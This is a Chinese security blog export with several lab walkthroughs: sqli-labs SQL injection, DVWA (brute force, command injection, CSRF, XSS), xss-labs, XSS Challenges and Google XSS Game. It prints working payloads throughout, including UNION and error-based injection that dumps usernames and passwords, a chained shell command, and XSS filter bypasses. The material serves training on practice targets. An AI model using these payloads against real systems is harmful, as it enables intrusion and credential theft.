破坏查询的同时，用--+修复它的语法错误，-- 是 SQL 的注释语句 输入 1'--+ 或者输入 1'--%20（%20 URL编码为空格） 或者输入 1'%23 （%23 URL编码为 # ） 1SELECT * from table_name WHERE id=&#x27;1&#x27;--+&#x27; LIMIT 0,1 使用联合查询 接下来在引号和 --+ 之间添加查询来获取数据库中的信息 通过order by 1来查询有几列，之所以需要知道数据库有几列是因为联合查询 union 规定的，得知总共有 3 列 ?id=1' order by 1 --+ --&gt; 返回正确 ?id=1' order by 4 --+ --&gt; 返回错误 1234-- UNION，没有错误?id=1&#x27; union select 1,2,3 --+SELECT * from table_name WHERE ?id=&#x27;1&#x27; union select 1,2,3 --+&#x27; 但是我们得到的是第一个查询的结果集，为了将第二个查询的结果显示在屏幕上，我们必须将第一条查询的结果集置为EMPTY。这点可通过给定 id 一个不存在的值来实现。我们可以将 id 的值设为负或者大于14，因为前面已经发现了数据库中只有14条记录。 union 12345?id=-1&#x27; union select 1,2,3 --+或者?id=15&#x27; union select 1,2,3 --+SELECT * from table_name WHERE ?id=&#x27;-1&#x27; union select 1,2,3 --+&#x27; 数据库的版本信息 1234-- 数据库的版本信息?id=-1&#x27; union select 1,2,version() --+-- 正在使用的数据库信息和当前后端所使用的数据库的版本信息?id=-1&#x27; union select 1,database(),version() --+ 基于错误返回的SQL查询 基于联合查询的SQL注入 为了让联合注入工作，首先要知道数据库中的表名，键入 123456789101112id=-1&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+-- 拆解id=-1&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ Your Login name:emails,referers,uagents,users Your Password:3 注入 联合查询 123?id=-1&#x27;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+?id=-1&#x27;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+ 报错注入 123?id=1&#x27;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+?id=1&#x27;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+ — 未完待续","tags":["SQL注入"],"categories":["网络安全"]},{"title":"DVWA 靶场","path":"/2023/02/26/DVWA-master/","content":"前言 https://github.com/digininja/DVWA 模块大榄 Brute Force（暴力破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA（不安全的验证码） SQL Injection（SQL注入） SQL Injection (Blind)（SQL盲注） XSS (Reflected)（反射型跨站脚本） XSS (Stored)（存储型跨站脚本） DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容 通关开始 第一关-Brute Force LOW PHP 代码——查询验证用户名和密码 1$query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; PHP 代码——登录前的验证 123456789# 请求不为空，查得到结果就行 if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; # 输出头像和用户名 $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; &#125; else &#123; 登录失败 &#125; SQL 在登录框中输入 12admin&#x27; or &#x27;1&#x27; = &#x27;1admin&#x27; or &#x27;1&#x27; = &#x27;2 123SELECT * FROM `users` WHERE user = &#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; AND password = &#x27;&#x27;-- or 一个为真，即可为真 Medium PHP 代码 1$user = mysql_real_escape_string( $user ); 单引号没有了，变成了转义\\ 1GET /DVWA-master/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login HTTP/1.1 High 多了token这个参数，过滤低级的爆破，校验 先抓包，火狐浏览器地址栏是明文的 1234567891011GET /DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65 HTTP/1.1多了这一段&amp;user_token=1884203513ab2b438bc4ec3182f62a65点击 intercept is on 变成了 intercept is off紧接着看网站浏览器的地址栏http://localhost/DVWA-master/vulnerabilities/brute/?username=amdin&amp;password=123&amp;Login=Login&amp;user_token=1884203513ab2b438bc4ec3182f62a65#接着开始改 Python 脚本 第二关-Command Injection LOW php 代码 123456789101112131415161718192021&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 网页输入 1127.0.0.1 &amp;&amp; ipconfig Medium High 第三关-CSRF 跨站请求伪造，有人戏谑为借刀杀人，借用户之刀，做恶行之事也 LOW 映入眼帘的是一个修改密码的界面，输入密码之后123 123 后，在地址栏中观察到 从而得知这是 GET 型提交，且这就是修改密码的链接。我们直接在地址栏中修改密码456，然后复制链接重新打开一个界面（需要注意的是，打开的界面必须在同一个浏览器，原因是 cookie 认证） 如图所示显示密码已更改，同时原密码123失效了。 但显然，长而冗杂的链接是令人厌烦的，诱导用户点击的话，可以通过构造短链接的形式，直接搜索“在线 短链接”即可找到 如何查看重定向之前的链接呢，可以借用curl -i url Medium 和 Low 级别相比，增添了 referer 判断。 referer 作为 HTTP 头中的一个字段，记录了 HTTP 请求的来源地址。 通过输入密码 123，通过 burp 抓包看看。 重复上次的操作，重新打开一个界面，在 burp 中进行抓包，发现没有 referer 字段 接下来可以在 burp 中手动伪造 referer 来执行 CSRF 攻击 1Referer: http://localhost/DVWA-master/vulnerabilities/csrf/ High 增加了 token 机制，当用户往服务器发送请求的时候，服务器通过校验请求是否携带正确的 Token，才会响应请求。 因为 GET 请求的参数会暴露在 URL 中，所以输入密码之后查看一下 token 第十关-XSS (DOM) Low 12345document.write(&quot;&lt;option value=&#x27;&quot; + lang + &quot;&#x27;&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;);document.write(&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;);// payload?default=English &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; Medium 123456789if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123; header (&quot;location: ?default=English&quot;); exit; // stripos() 函数 --&gt; 查找 &quot;&lt;script&quot; 在字符串（default 变量）中第一次出现的位置：// header函数 --&gt; Location类型的标头是一种特殊的header调用，常用来实现页面跳转。匹配通过将跳转 ?default=English // input 事件，制造一个 input 输入框，当 onclick 点击的时候触发 xss 攻击?default=English&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt; High 1234567891011121314151617181920if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123; # White list the allowable languages switch ($_GET[&#x27;default&#x27;]) &#123; case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit;// switch 语句 --&gt; 有选择地执行若干代码块之一// !is_null --&gt; 检测变量是否不为 NULL。// 如果 default 变量的值不为 French、English……这些，default 变量就重置为 ?default=English// 闭合 option 和 select 标签，然后使用 # 来注释?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;?default=English#&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt; 第十一关-XSS (Reflected) LOW 12345678910// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user $html .= &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;// 从源代码中可看到没有对 name 做其他限制，只检测了 != null 且变量存在// payload&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; Medium 12345678if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // 从源代码中可以看到 &lt;script&gt; 标签进行了过滤，那就换个标签// payload&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt; High 123456&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;// 正则表达式过滤，script 不区分大小写，并且使用了通配符 * 匹配// payload&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt; 第十二关-XSS (Stored) LOW 123// payloadName: 1Message: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; 123456-- 从数据库中查看mysql -u root -prootSHOW DATABASES;USE `dvwa`select * from guestbook;delete from guestbook; Medium 123456// payloadName: &lt;Script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;Message: www.sqlsec.comName: &lt;s&lt;script&gt;cript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;Message: www.sqlsec.com High 123// payloadName: &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;Message: www.sqlsec.com","tags":["DVWA"],"categories":["网络安全"]},{"title":"xss-labs","path":"/2023/02/21/xss-labs/","content":"do0dl3/xss-labs: xss 跨站漏洞平台 (github.com) level 1 观察地址栏得知是GET请求，参数是name，值为test 修改参数值定位位置，发现是在 h2标签内，判断为反射型xss 于是直接在把name参数赋值为： 1&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; 从浏览器观察直接弹出来了，查看一下源码，发现有一个str变量，值是name，同时str变量又被放在了h2标签中，且没做任何过滤处置。 12$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; level 2 从地址栏观察URL发现依旧是GET方式来传递参数，不言而喻是反射型XSS 使用第一关的&lt;script&gt;alert('xss')&lt;/script&gt;，发现并没有出现弹窗，查看页面源代码，发现在h2标签中，&lt;script&gt;的&lt;&gt;被HTML实体化了 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 但 input 标签中的 value 参数没有被 HTML 编码，于是用&quot;&gt;分别闭合value属性和input标签，最后用//注释后面的&quot;&gt; 12// payload&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;// 最后在 less-2.php 中查看，发现标签h2之所以被编码，是因为有htmlspecialchars()函数，换言之在网页上输入的字符会经过htmlspecialchars()函数对其进行 HTML 实体才会展示在页面上。 htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。 1234$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt; 页面源代码 闭合在标签外构造 XSS level 3 修改参数值定位具体位置，发现和 level 2 是一样的，在h2和input标签中 顾忌到会有编码之类，使用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，然后 Ctrl + U 查看页面源代码。果不其然，与 level 2 不同的是，这关h2和input标签中的str变量皆难逃被编码之命 &lt; --&gt; &amp;lt; &gt; --&gt; &amp;gt; 因为过滤了&lt;&gt;，这说明不可以用新标签，只能在标签内通过'闭合前面的属性的方式，为后面新增属性来绕过，与此同时想到的是“鼠标事件” 123// 用 &#x27; 闭合 value 的值，新增点击事件，在 input 框中去点击一下即可触发// 根据源码，闭合需用单引号&#x27; onclick =&#x27;javascript:alert(1)&#x27;// 1234$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; 页面源代码 新增属性构造 XSS level 4 修改参数值定位具体位置，依旧是在h2和input标签中，用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，查看页面源代码，发现h2标签的参数依旧被 HTML 实体，仍然是&lt;&gt;字符 但与之前不同的是，input标签中的value属性的值，没有出现&lt;&gt;字符，所以还是用闭合属性新增鼠标事件的方式来绕过 1&quot; onclick =&quot;javascript:alert(1)&quot;// 最后在 less-4.php 中查看，出现了str_replace() 函数 str_replace(&quot;&gt;&quot;,&quot;&quot;,$str); --&gt; 在 str 变量中，将&lt;&gt;字符替换为空 htmlspecialchars() 函数 --&gt; 把一些预定义的字符转换为 HTML 实体。 123456$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt; 页面源代码 点击事件 level 5 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 script --&gt; scr_ipt 尝试&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 onclick --&gt; o_nclick 于是换一种思路，用&quot;&gt; 来闭合 input 标签，利用a标签的href属性可以执行 JavaScript 伪协议的特性，绕过众多检测 1234&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//// 看到还有一种方式，可直接触发&quot;&gt;&lt;iframe src=javascript:alert(1)&gt; 最后在 less-5.php 中查看，出现了strtolower() 函数 strtolower() 函数 --&gt; 把字符串转换为小写，赋值给str变量，这样大小写绕过就失效了 str_replace --&gt; 加入了_破坏完整的字符 123456$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt; 测试一 测试二 JavaScript 伪协议 level 6 用&lt;script&gt;alert('xss')&lt;/script&gt;来测试，发现在h2标签中仍是&lt;&gt;字符被 HTML 实体了，而input标签的value属性中，完整的script被_断开了 尝试点击事件&quot; onclick =&quot;javascript:alert(1)&quot;//，发现在h2标签中&quot;双引号被 HTML 实体了，而input标签的value属性中的值，完整的onclick被_断开了 试一下伪协议&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//，完整的href被_断开了 于是使用*大小写绕过* 12345// 点击事件大小写绕过&quot; ONCLICK =&quot;alert(1)&quot;//// 伪协议大小写绕过&quot;&gt;&lt;a HREF=javascript:alert(1)&gt;xss&lt;/a&gt;// 查看 level6.php，可以看到 str_replace 函数分别破坏了&lt;script、on、src、data、href等元素。h2 标签处做了 HTML 实体 123456789$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt; level 7 通过测试，发现 input 标签的 value 属性的值 script、on、href被直接替代为了空，h2 标签依旧是 HTML 实体了 于是通过**双写绕过**的方式去绕过检测 12345678// script&quot;&gt;&lt;scrscriptipt&gt;alert(&#x27;xss&#x27;)&lt;/scrscriptipt&gt;// href 和 script，伪协议&quot;&gt; &lt;a hrhrefef=javascscriptript:alert(1)&gt;1&lt;/a&gt;//// 点击事件&quot; oonnclick =&quot;javascscriptript:alert(1)&quot;// 查看 level7.php，可以看到 str_replace 函数分别把&lt;script、on、src、data、href替代为了空 h2 标签处做了 HTML 实体，strtolower()函数把字符串转换为小写 123456789$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt; level 8 定位一下，第一个参数在 input 标签的 value 属性中， 第二个参数在 a 标签的 href 属性中 通过测试，发现在 input 标签的 value 属性中&lt;&gt; &quot;被 HTML 编码了，a 标签的 href 属性把script、on、src、data、href用_截断了，同时&quot;被 HTML 编码了 使用大小写绕过也失败了，说明有 strtolower 函数。 因为第二个参数在 href属性中，而href属性支持构造伪协议，但script被_所限制，于是尝试用编码的方式去绕过 123javascript:alert(1)&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; HTML 编码 HTML 编码 level 9 定位参数，第一个参数照旧，第二个参数还是在 a 标签的 href 属性中 用javascript:alert(1)测试，a 标签的 href 属性的值显示“您的链接不合法” 一般而言，href 属性是要填 URL 的，那就补上一个https://www.google.com 输入javascript:alert(1)//http://www.baidu.com，从页面源代码处看到script被_截断了，那就 HTML 编码一下 12java&amp;#x73;cript:alert(1)//http://www.baidu.com// ｓ--&gt; &amp;#x73; 从 level9.php 可以观察到，如果没有http://字符，会输出链接不合法 1234if(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;; &#125; level 10 从 URL 处输入测试参数，然后 CTRL+U 查看页面源代码发现有三个 input 标签，且 type=“hidden”，也就是隐藏表单。 把三个 input 标签的类型修改为 text，看在页面的显示情况 1234// 发现页面出现文本框，t_sort，这证明可对其进行突破text&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;// 出现文本框后可直接注入 XSS 代码&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) 从源码看把&lt;&gt;替换为空了，这恐怕只能在标签内部通过新增属性的方式来答题了 123456789$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt; 隐藏表单 点击 input 框触发 xss level 11 查看源代码发现 t_ref 的 value 值为上道题的 URL，由此判断 value 值就是 referer，referer 用于告知服务器用户的来源页面，所以这道题直接篡改 referer 就可以了 1referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) 页面源代码 点击 input 框触发 xss 源码 level 12 CTRL+U 查看源代码发现 t_ua 的 value 值为 User-Agent，也就是用户代理，通常标识浏览器、及其版本号及其主机操作系统。 1User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) User-Agent 点击 input 框触发 xss 源码 level 13 CTRL+U 查看源代码发现 t_cook 的 value 值为call me maybe?，使用浏览器插件 Cookie Editor 查看 cookie 的值与之相似，于是判定 value 值就是 cookie 1user=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;) 对比查看是 cookie 修改 cookie 点击 input 框触发 xss 源码 level 14 网页一直在响应，最终以失败告终，查看源码发现原链接已经失效 这关主要考察Exif，Exif 记录着照片的属性信息和拍摄数据，可以更改图片的参数把一张恶意的图片传到可执行该信息的网站 level 15 查看页面源码，最底部有一行 span 标签，class 属性是ng-include 1&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt; 查询了一下得知是前端框架 angular js 里面的，含义是文件包含 于是可以把本地文件level1.php包含起来让其执行 XSS 1?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; level 16 用&lt;script&gt;alert('xss')&lt;/script&gt;测试，查看页面源代码，发现参数值在 center 标签中，而用于构造 XSS 的script、/、空格被替换为了&amp;nbsp; /被编码这意味着像是&lt;&gt;&lt;/&gt;需要闭合的标签用不了，所以想到了&lt;img&gt;这种自闭和的标签 换行符 --URL编码后--&gt; %0a 123456789// 直接输入发现“空格”被替换为了 &amp;nbsp; 因此考虑用 %0a 即换行符绕过空格&lt;img src=”1” onerror=alert(‘xss’)&gt;&lt;img%0asrc=1%0aonerror=alert(1)&gt;&lt;imgsrc=”1”onerror=alert(‘xss’)&gt; URL 解码 插入 XSS level 17 在 URL 中填上参数?arg01=1111&amp;arg02=2222，然后查看页面源代码，发现有个 embed 标签，填入的参数在 src 属性中进行了拼接 &lt;embed&gt;标签就是引入一个swf文件【SWF格式是动画软件Flash的专用格式】 12&lt;!-- 查看页面源代码 --&gt;&lt;embed src=xsf01.swf?1111=2222 width=100% heigth=100%&gt;&lt;h2 align=center&gt; 1234?arg01= onclick&amp;arg02=alert(‘xss’) //&#x27; &gt; onmouseover=alert(1) 火狐、Chrom、Edge 等浏览器已不支持 flash，所以不会弹窗 level 18 和 level 17 是一样的 level 19、20 IE 浏览器和 flash 均已被历史淘汰","tags":["XSS"],"categories":["网络安全"]},{"title":"XSS Challenges","path":"/2023/02/13/XSS Challenges/","content":"XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;/b&gt;标签之内，没有任何过滤 12345// 第一种方法是闭合 b 标签，插入 Script 标签&quot;&lt;/b&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//// 第二种方法是直接在 b 标签内部构造 XSS&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 闭合 b 标签的方式 直接在 b 标签内部构造 XSS Stage #2 输入321来定位代码的位置，发现注入点在input标签的value属性里面 123456// 第一种方法是闭合 input 标签，插入 Script 标签&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//// 第二种方法是在 input 标签中插入属性// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 闭合 input 标签，插入 Script 标签 input 标签中插入属性 Stage #3 输入321来定位代码的位置，发现注入点在b标签，于是乎使用 stage1 的 payload，结果失败了 失败原因，用于构造标签的&lt;&gt;和&quot;被转义了 &lt;&gt; --&gt; &amp;lt;&amp;gt; &quot; --&gt; &amp;quot; 通过查看源代码发现有两个参数，P1 是文本输入，P2 是下拉列表，因为 P1 有过滤，所以对 P2 进行注入 用 burp 截取数据包，篡改 P2 的值，Forward 放包之后会发现弹出 12// burp 中对 P2 参数进行注入， p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 两个参数 Stage #4 输入321来定位代码的位置，发现注入点还是在b标签，但是用 burp 抓包后发现了三个参数，P1、P2、P3 从源代码中搜索 P3 的值 hackme，发现是在一个 input 标签的 value 属性中，且type=&quot;hidden&quot;，这说明该 input 元素在网页页面是不可见的，换言之网页上面不显示输入框，做了隐藏处理。 12// 用 burp 截取数据包，然后对 P3 参数进行篡改，用 &quot;&gt; 闭合 input 标签，插入 Script 标签&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 查询 P3 的值 在 burp 中修改 P3 的值然后放包 P3 参数处注入 Stage #5 输入321来定位代码的位置，发现注入点在input标签的value属性里面 但与 Stage #2 不同的是 input 标签中加入了maxlength 属性，其值为15，意思是输入的字符不能超过 15。 maxlength 属性规定 元素中允许的最大字符数。 像是这中前端的设置是可以在源代码中进行修改，进而绕过限制 然后把maxlength的值设置为100，接着就是 Stage #2 的步骤 123456// 第一种方法是闭合 input 标签，插入 Script 标签&quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;//// 第二种方法是在 input 标签中插入属性// onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 修改 maxlength 的值 成功弹窗 Stage #6 输入321来定位代码的位置，发现注入点还是在input标签的value属性中 于是用 Stage #2 闭合input 的方式来构造 XSS，测试后发现过滤了&lt;&gt;，但没有过滤&quot;， 这说明不可以用新标签，只能在input标签内通过&quot;闭合前面的属性的方式，为后面新增属性 &gt; --&gt; &amp;gt; HTML 事件 | 菜鸟教程 (runoob.com) 12345// 需要点击搜索框触发，&quot; onclick=alert(document.domain)\t// 需要移动到搜索框触发&quot; onmouseover=alert(document.domain) 查看过滤情况 鼠标事件 Stage #7 注入点还是在input标签的value属性中，但依旧是过滤了&lt;&gt;和&quot; 12345&quot; onmouseover=alert(document.domain)// 321 会写入 input 的 value 值中，空格做个分隔，写后面的属性321 οnmοuseοver=alert(document.domain)321 onclick=alert(document.domain) 查看过滤 用点击事件 Stage #8 输入字符发现注入点在a标签的href属性中，随即想到JavaScript 伪协议绕过（需要点一下链接才能弹窗） 123// javascript 伪协议// &lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL，href 属性的值可以是 JavaScript 表达式javascript:alert(document.domain); 定位 JavaScript 伪协议 Stage #9 听说开发者是日本人，难怪会有这种题目 通过 burp 抓包发现参数是charset=euc-jp，亦即日文编码，需要识别 UTF-7 的 IE 浏览器（但 IE 已经退役了……） 看了其他人的方法，在控制台输出弹窗绕过 Stage #10 定位在input标签的value属性中，但domain过滤了，可以使用嵌套绕过的方式 1234567// 嵌套绕过&quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt;// 看其他人有用 base 64 编码的方式来绕过的，但是需要解密函数 atob() 对字符串进行解密再进行执行// eval()函数计算 JavaScript 字符串，并把它作为脚本代码来执行alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;&gt;&lt;script&gt;eval(atob(&#x27;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#x27;));&lt;/script&gt; 嵌套 Stage #11 从此关开始打不开了","tags":["XSS"],"categories":["网络安全"]},{"title":"Google XSS Game","path":"/2023/02/11/Google XSS Game/","content":"XSS game (xss-game.appspot.com) 这是一款谷歌的 XSS 游戏，总共有 6 个级别 Level 1 无需转义，直接编辑 URL 栏或者搜索框中都可以执行 1&lt;script&gt;alert(1)&lt;/script&gt; Level 2 留言板中放入&lt;script&gt;alert(1)&lt;/script&gt;发现不弹窗，说明&lt;script&gt; 标签不起作用，转译成了HTML实体，可以选择其他能够触发 JavaScript 代码的命令 12// 标签与属性一起使用，onerror 事件会在文档或图像加载过程中发生错误时被触发。&lt;img src=&#x27;#&#x27; onerror=alert(1) /&gt; Level 3 123456// 查看源代码function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src=&#x27;/static/level3/cloud&quot; + num + &quot;.jpg&#x27; /&gt;&quot;; $(&#x27;#tabContent&#x27;).html(html); 12// 用 &#x27; 闭合 src 属性，用 /&gt; 闭合 img 标签&#x27; onerror=&#x27;alert(1)&#x27;/&gt; Level 4 123// 闭合 startTimer() 函数，用 , 连接写入 alert() 方法// onload 事件在图片加载完成后立即执行100&#x27;),alert(&#x27;1 Level 5 12345// 这是基于 DOM 的 